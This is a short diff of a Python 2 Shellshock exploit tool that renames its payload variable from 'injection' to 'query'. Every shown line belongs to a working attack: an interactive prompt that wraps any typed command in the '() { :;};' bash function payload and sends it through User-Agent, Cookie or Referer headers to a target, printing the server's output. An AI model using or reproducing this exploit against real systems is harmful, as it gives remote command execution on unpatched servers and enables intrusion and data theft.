@@ -41,14 +41,14 @@ def main():
 			command = raw_input("w00t@UrduSecurity~$ ")
 			if command.strip() == 'exit':
 				break
-			injection = "() { :;}; echo \"Content-Type: text/html\"; echo; echo; /bin/bash -c \"" + command + "\""
+			query = "() { :;}; echo \"Content-Type: text/html\"; echo; echo; /bin/bash -c \"" + command + "\""
 			request = urllib2.Request(args.ip)	
 			if args.u:
-		    		request.add_header("User-Agent", injection)
+		    		request.add_header("User-Agent", query)
 			if args.c:
-		    		request.add_header("Cookie", injection)
+		    		request.add_header("Cookie", query)
 			if args.r:
-		    		request.add_header("Referer", injection)
+		    		request.add_header("Referer", query)
 			result = urllib2.urlopen(request).read()
 			print result.strip()
 	except:
